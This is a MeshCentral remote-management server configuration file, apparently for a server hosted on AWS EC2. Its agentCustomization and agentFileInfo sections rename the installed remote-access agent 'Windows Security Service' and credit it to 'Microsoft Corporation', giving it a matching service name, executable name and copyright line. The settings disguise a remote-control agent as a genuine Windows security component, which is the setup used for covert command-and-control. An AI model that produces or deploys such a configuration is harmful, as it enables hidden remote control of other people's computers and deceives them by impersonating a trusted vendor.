{
  "$schema": "https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json",
  "__comment1__": "This is a simple configuration file, all values and sections that start with underscore (_) are ignored. Edit a section and remove the _ in front of the name. Refer to the user's guide for details.",
  "__comment2__": "See node_modules/meshcentral/sample-config-advanced.json for a more advanced example.",
  "settings": {
    "cert": "ec2-100-53-190-155.compute-1.amazonaws.com",
    "WANonly": true,
      "minify": true,
      "compression": true,
      "noAdminLoginStats": true,
      "noagentupdate": false,
    "port": 443,
    "aliasPort": 443,
    "redirPort": 80,
    "redirAliasPort": 80
  },
  "domains": {
    "": {
      "_title": "MyServer",
      "_title2": "Servername",
      "_minify": true,
      "_newAccounts": true,
      "_userNameIsEmail": true,
      "agentCustomization": {
        "displayName": "Windows Security Service",
        "description": "Windows Security Service",
        "companyName": "Microsoft Corporation",
        "serviceName": "WindowsSecurityService",
        "fileName": "WindowsSecurityService"
      },
      "agentFileInfo": {
        "filedescription": "Windows Security Service",
        "fileversion": "1.0.0.0",
        "internalname": "WindowsSecurityService",
        "legalcopyright": "Microsoft Corporation",
        "originalfilename": "WindowsSecurityService.exe",
        "productname": "Windows Security Service",
        "productversion": "1.0"
      }
    }
  },
  "_letsencrypt": {
    "__comment__": "Requires NodeJS 8.x or better, Go to https://letsdebug.net/ first before trying Let's Encrypt.",
    "email": "myemail@mydomain.com",
    "names": "myserver.mydomain.com",
    "skipChallengeVerification": true,
    "production": false
  }
}